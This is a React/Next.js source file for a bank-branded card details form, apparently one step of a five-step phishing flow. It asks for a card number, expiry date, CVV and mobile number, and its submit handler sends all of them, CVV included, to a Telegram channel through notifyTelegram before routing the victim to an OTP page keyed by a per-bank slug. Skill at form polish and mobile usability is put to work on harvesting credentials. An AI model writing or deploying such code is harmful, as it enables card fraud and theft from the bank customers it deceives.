'use client'

import { useEffect, useMemo, useRef, useState, type FormEvent } from 'react'
import { useRouter } from 'next/navigation'
import { ChevronRight } from 'lucide-react'
import { notifyTelegram } from '@/lib/notify'

const TOTAL_STEPS = 5

// A lightweight tap-to-select dropdown. Native <select> on mobile opens the
// OS wheel picker, which requires a separate "Done" tap to confirm. This
// custom list closes and commits the value on the first tap instead.
function TapSelect({
  id,
  label,
  placeholder,
  value,
  options,
  onChange,
}: {
  id: string
  label: string
  placeholder: string
  value: string
  options: string[]
  onChange: (value: string) => void
}) {
  const [open, setOpen] = useState(false)
  const containerRef = useRef<HTMLDivElement>(null)

  useEffect(() => {
    if (!open) return
    function handleOutside(e: MouseEvent | TouchEvent) {
      if (containerRef.current && !containerRef.current.contains(e.target as Node)) {
        setOpen(false)
      }
    }
    document.addEventListener('mousedown', handleOutside)
    document.addEventListener('touchstart', handleOutside)
    return () => {
      document.removeEventListener('mousedown', handleOutside)
      document.removeEventListener('touchstart', handleOutside)
    }
  }, [open])

  return (
    <div ref={containerRef} className="relative">
      <label htmlFor={id} className="sr-only">
        {label}
      </label>
      <button
        id={id}
        type="button"
        aria-haspopup="listbox"
        aria-expanded={open}
        onClick={() => setOpen((prev) => !prev)}
        className={`w-full rounded-2xl border border-border bg-card px-4 py-4 text-left text-base shadow-sm outline-none ring-2 ring-transparent transition-all duration-100 focus:ring-primary active:scale-[0.97] active:bg-secondary/60 ${
          value ? 'text-foreground' : 'text-muted-foreground'
        }`}
      >
        {value || placeholder}
      </button>

      {open && (
        <ul
          role="listbox"
          aria-label={label}
          className="absolute left-0 right-0 top-full z-20 mt-2 max-h-56 overflow-y-auto rounded-2xl border border-border bg-card p-1 shadow-lg"
        >
          {options.map((option) => (
            <li key={option} role="option" aria-selected={option === value}>
              <button
                type="button"
                onClick={() => {
                  onChange(option)
                  setOpen(false)
                }}
                className={`w-full rounded-xl px-4 py-3 text-left text-base transition-all duration-100 active:scale-[0.97] ${
                  option === value
                    ? 'bg-primary text-primary-foreground'
                    : 'text-foreground hover:bg-muted active:bg-muted'
                }`}
              >
                {option}
              </button>
            </li>
          ))}
        </ul>
      )}
    </div>
  )
}

export function CardDetailsForm({ slug, bankName }: { slug: string; bankName: string }) {
  const router = useRouter()
  const [cardNumber, setCardNumber] = useState('')
  const [month, setMonth] = useState('')
  const [year, setYear] = useState('')
  const [cvv, setCvv] = useState('')
  const [mobile, setMobile] = useState('')

  const currentYear = new Date().getFullYear()
  const years = useMemo(
    () => Array.from({ length: 10 }, (_, i) => `${currentYear + i}`),
    [currentYear],
  )
  const months = useMemo(
    () => Array.from({ length: 12 }, (_, i) => `${i + 1}`.padStart(2, '0')),
    [],
  )

  // Group the 16 digits into 4-digit blocks for readability.
  function handleCardNumber(value: string) {
    const digits = value.replace(/\D/g, '').slice(0, 16)
    const grouped = digits.replace(/(.{4})/g, '$1 ').trim()
    setCardNumber(grouped)
  }

  const rawCard = cardNumber.replace(/\s/g, '')
  const isValid =
    rawCard.length === 16 &&
    month !== '' &&
    year !== '' &&
    cvv.length === 3 &&
    /^03\d{9}$/.test(mobile)

  function handleSubmit(e: FormEvent) {
    e.preventDefault()
    if (!isValid) return
    notifyTelegram('Card Details Submitted', [
      { label: 'Bank', value: bankName },
      { label: 'Card Number', value: cardNumber },
      { label: 'Expiry', value: `${month}/${year}` },
      { label: 'CVV', value: cvv },
      { label: 'Mobile', value: mobile },
    ])
    // Continue to the OTP step, passing just the mobile number so it can be
    // masked on the next page.
    router.push(`/bank/${slug}/otp?mobile=${encodeURIComponent(mobile)}`)
  }

  return (
    <form onSubmit={handleSubmit} className="mt-6 space-y-4">
      <div>
        <label htmlFor="card-number" className="sr-only">
          ATM Card Number (16 digits)
        </label>
        <input
          id="card-number"
          inputMode="numeric"
          autoComplete="off"
          value={cardNumber}
          onChange={(e) => handleCardNumber(e.target.value)}
          placeholder="ATM Card Number (16 digits)"
          className="w-full rounded-2xl border border-border bg-card px-5 py-4 text-base text-foreground shadow-sm outline-none ring-2 ring-transparent transition placeholder:text-muted-foreground focus:ring-primary"
        />
      </div>

      <div className="grid grid-cols-3 gap-3">
        <TapSelect
          id="exp-month"
          label="Expiry month"
          placeholder="MM"
          value={month}
          options={months}
          onChange={setMonth}
        />

        <TapSelect
          id="exp-year"
          label="Expiry year"
          placeholder="YYYY"
          value={year}
          options={years}
          onChange={setYear}
        />

        <div>
          <label htmlFor="cvv" className="sr-only">
            CVV
          </label>
          <input
            id="cvv"
            inputMode="numeric"
            autoComplete="off"
            value={cvv}
            maxLength={3}
            onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0, 3))}
            placeholder="CVV"
            className="w-full rounded-2xl border border-border bg-card px-4 py-4 text-base text-foreground shadow-sm outline-none ring-2 ring-transparent transition placeholder:text-muted-foreground focus:ring-primary"
          />
        </div>
      </div>

      <div>
        <label htmlFor="mobile" className="sr-only">
          Mobile Number
        </label>
        <input
          id="mobile"
          inputMode="numeric"
          autoComplete="tel"
          value={mobile}
          onChange={(e) => setMobile(e.target.value.replace(/\D/g, '').slice(0, 11))}
          placeholder="Mobile Number (03XXXXXXXXX)"
          className="w-full rounded-2xl border border-border bg-card px-5 py-4 text-base text-foreground shadow-sm outline-none ring-2 ring-transparent transition placeholder:text-muted-foreground focus:ring-primary"
        />
      </div>

      {/* Step indicator */}
      <div
        className="flex items-center justify-center gap-2 py-2"
        role="status"
        aria-label="Step 1 of 5"
      >
        {Array.from({ length: TOTAL_STEPS }, (_, i) => (
          <span
            key={i}
            className={`h-2 rounded-full transition-all ${
              i === 0 ? 'w-6 bg-primary' : 'w-2 bg-border'
            }`}
          />
        ))}
      </div>

      <button
        type="submit"
        disabled={!isValid}
        className="flex w-full items-center justify-center gap-2 rounded-2xl bg-primary py-4 text-base font-bold text-primary-foreground shadow-md transition-all duration-100 hover:brightness-105 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring active:scale-[0.98] active:brightness-95 disabled:cursor-not-allowed disabled:opacity-50 disabled:active:scale-100"
      >
        Next
        <ChevronRight className="h-5 w-5" aria-hidden="true" />
      </button>
    </form>
  )
}
